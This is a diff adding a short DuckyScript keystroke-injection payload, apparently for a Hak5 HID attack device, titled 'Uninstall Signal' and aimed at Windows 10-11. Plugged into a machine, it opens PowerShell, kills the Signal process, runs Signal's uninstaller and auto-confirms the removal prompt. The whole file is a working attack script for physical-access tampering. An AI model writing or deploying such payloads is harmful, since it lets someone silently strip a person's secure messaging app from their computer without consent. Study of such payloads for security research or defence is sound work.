@@ -1,0 +1,34 @@
+#####################################
+#                                   #
+# Title        : Uninstall Signal   #
+# Author       : Aleff              #
+# Version      : 1.0                #
+# Category     : Execution          #
+# Target       : Windows 10-11      #
+#                                   #
+#####################################
+
+ATTACKMODE HID
+
+# Plug-And-Play <3
+
+# Requirements:
+#   - Signal App installed
+#   - ExecutionPolicy Bypass
+
+QUACK DELAY 2000
+QUACK GUI r
+QUACK DELAY 1000
+QUACK STRING powershell
+QUACK ENTER
+QUACK DELAY 2000
+
+QUACK STRING Stop-Process -Name \"Signal\"
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING  Start-Process \"\$env:LocalAppData\Programs\signal-desktop\Uninstall Signal.exe\"
+QUACK ENTER
+QUACK DELAY 1000
+# Popup 'Are you sure?'
+QUACK ENTER
+QUACK ALT F4
